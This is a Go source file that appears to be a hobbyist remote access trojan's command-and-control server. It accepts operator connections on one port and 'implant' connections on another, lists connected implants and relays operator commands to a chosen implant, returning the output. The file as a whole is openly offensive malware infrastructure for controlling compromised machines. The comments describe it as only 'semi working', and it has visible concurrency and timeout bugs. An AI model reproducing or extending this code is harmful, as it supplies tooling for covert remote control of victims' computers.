package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Maintain some kind of array to keep a list of commands to execute.

/*

	On Rat connection => some info about pc to the server => Server sends this to client

	On Client req command (IpAddr, Command)

	This gets pushed to a map and the handRatConnection checks for these commands in it's loop

*/

// Read up on go concurrency
// The shit is semi working just need to make it for multiple clients
// Maybe add a queue then a main thread to add data to the global variables

type Command struct {
	implantID string
	command   string
}

type Response struct {
	implantID string
	result    string
}

// response channel write Client Disconnect:
// response channel write Client Connect:
var CONNECTED_IMPLANTS map[string]struct{}

func main() {

	commandChan := make(chan Command)
	responseChan := make(chan Response)

	CONNECTED_IMPLANTS = make(map[string]struct{})

	var wg sync.WaitGroup

	if len(os.Args) < 3 {
		fmt.Println("Please invoke the server with run main.go <client_port> <rat_port>")
		return
	}

	var client_port string = os.Args[1]
	var rat_port string = os.Args[2]

	go setupClientConnection(client_port, &wg, commandChan, responseChan)
	go setupRatConnection(rat_port, &wg, commandChan, responseChan)

	wg.Wait()
	select {}
}

func setupClientConnection(client_port string, wg *sync.WaitGroup, commandChan chan Command, responseChan chan Response) {
	portInt, err := strconv.Atoi(client_port)

	if err != nil {
		fmt.Println("Failed to convert port to number please provide port as a number")
		return
	}

	if portInt < 0 || portInt > 65535 {
		fmt.Println("Invalid port. Needs to be greater than 0 and less than 65535")
		return
	}

	stream, err := net.Listen("tcp", ":"+client_port)

	if err != nil {
		fmt.Println(err)
		return
	}
	defer stream.Close()

	fmt.Println("Listening on " + client_port)

	for {
		conn, err := stream.Accept()

		if err != nil {
			fmt.Println(err)
			return
		}

		wg.Add(1)
		go handleClientConnection(conn, wg, commandChan, responseChan)
	}
}

func setupRatConnection(rat_port string, wg *sync.WaitGroup, commandChan chan Command, responseChan chan Response) {
	portInt, err := strconv.Atoi(rat_port)

	if err != nil {
		fmt.Println("Failed to convert port to number please provide port as a number")
		return
	}

	if portInt < 0 || portInt > 65535 {
		fmt.Println("Invalid port. Needs to be greater than 0 and less than 65535")
		return
	}

	stream, err := net.Listen("tcp", ":"+rat_port)

	if err != nil {
		fmt.Println(err)
		return
	}
	defer stream.Close()

	fmt.Println("Listening on " + rat_port)

	for {
		conn, err := stream.Accept()

		if err != nil {
			fmt.Println(err)
			return
		}

		wg.Add(1)
		go handleRatConnection(conn, wg, commandChan, responseChan)
	}
}

func handleClientConnection(conn net.Conn, wg *sync.WaitGroup, commandChan chan Command, responseChan chan Response) {
	defer conn.Close()
	defer wg.Done()

	reader := bufio.NewReader(conn)

	for {
		conn.SetReadDeadline(time.Now().Add(1000))

		buffer := make([]byte, 1024)

		n, err := reader.Read(buffer)
		if err != nil {

			if netError, ok := err.(net.Error); ok && netError.Timeout() {
				continue
			}
			if err.Error() == "EOF" {
				fmt.Println("Connection closed by client.")
				break
			}
			log.Fatalf("Error reading from connection: %v", err)
		}

		if n > 0 {
			data := string(buffer[:n])
			if data == "connections\x00" {
				if len(getConnections()) == 0 {
					conn.Write([]byte("no connections"))
				}

				conn.Write([]byte(getConnections()))
				continue
			}

			targetImplantID := strings.Split(data, ",,,")[0]
			command := strings.Split(data, ",,,")[1]

			commandChan <- Command{implantID: targetImplantID, command: command}

			if command == "quit\x00" {
				continue
			}

			responseRecv := false

			for !responseRecv {
				response := <-responseChan
				_, err := conn.Write([]byte(response.result))
				responseRecv = true
				if err != nil {
					fmt.Println("Error writing response to client:", err)
					return
				}
			}
		}
	}
}

func handleRatConnection(conn net.Conn, wg *sync.WaitGroup, commandChan chan Command, responseChan chan Response) {
	defer wg.Done()
	defer conn.Close()
	defer delete(CONNECTED_IMPLANTS, conn.RemoteAddr().String())

	fmt.Println("New connection on: " + conn.RemoteAddr().String())
	CONNECTED_IMPLANTS[conn.RemoteAddr().String()] = struct{}{}

	implantID := conn.RemoteAddr().String()

	for {
		select {
		case command := <-commandChan:
			if command.implantID == implantID {
				_, err := conn.Write(append([]byte(command.command), 0))
				if err != nil {
					fmt.Println("Error writing command to implant:", err)
					return
				}

				data, err := bufio.NewReader(conn).ReadString(0)
				if err != nil {
					fmt.Println("Error writing command to implant:", err)
					return
				}

				responseChan <- Response{implantID: implantID, result: data}
			}
		}
	}
	conn.Close()
}

func getConnections() string {
	var sb strings.Builder

	for implantID := range CONNECTED_IMPLANTS {
		sb.WriteString(implantID + " ")
	}

	return sb.String()
}
